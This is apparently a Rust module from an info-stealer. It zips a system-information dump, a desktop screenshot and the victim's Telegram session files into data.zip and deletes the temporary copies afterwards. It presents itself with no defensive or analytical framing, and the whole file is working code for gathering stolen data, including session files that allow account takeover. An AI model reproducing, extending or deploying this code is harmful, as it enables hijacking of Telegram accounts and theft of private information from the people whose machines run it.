pub mod zip_md
{
	// PACKAGES
	use std::fs;
	use std::fs::File;
	use std::path::Path;
	use zip::write::FileOptions;
	use zip::write::ZipWriter;


	pub fn start() -> std::io::Result<()>
	{
		let file = File::create("data.zip")?;
		let mut zip = ZipWriter::new(file);


		// CREATE OPTIONS FOR THE ZIP FILE (COMPRESSION LEVEL & OTHER OPTIONS)
		let options = FileOptions::default()
			.compression_method(zip::CompressionMethod::Stored) // NO COMPRESSION
			.unix_permissions(0o755);


		zip.start_file(format!("{}/", "telegram-session"), options)?;


		//ADDS A OS-INFO TO THE ZIP FOLDER
		{
			fs::File::create("info.txt").expect("info.txt didn't created");
			fs::write("info.txt", crate::sysinfo::sysinfo_md::start()).expect("Unable to write file");

			zip.start_file("info.txt", options)?;
			let mut file_content = File::open("info.txt")?;
			std::io::copy(&mut file_content, &mut zip)?;

			fs::remove_file("info.txt");
		}

		//ADDS A DESKTOP'S SCREENSHOT TO THE ZIP FOLDER
		{
			crate::screen::screen_md::start();

			zip.start_file("screen-1.png", options)?;
			let mut file_content = File::open("screen-1.png")?;
			std::io::copy(&mut file_content, &mut zip)?;

			fs::remove_file("screen-1.png");
		}

		// ADDS A FOLDER WHICH CONTAIN TELEGRAM'S SESSIONS
		{
			let files: Vec<String> = crate::session::telegram_md::start();

			for x in files
			{
				if let Some(nm) = Path::new(&x).file_name() {
					let name = nm.to_string_lossy();
					
					zip.start_file(format!("telegram-session/{}", name), options)?;
					let mut file_content = File::open(x)?;
					std::io::copy(&mut file_content, &mut zip)?;
				}
			}
		}		


		zip.finish()?;
		println!("Zip folder created successfully.");
		Ok(())
	}
}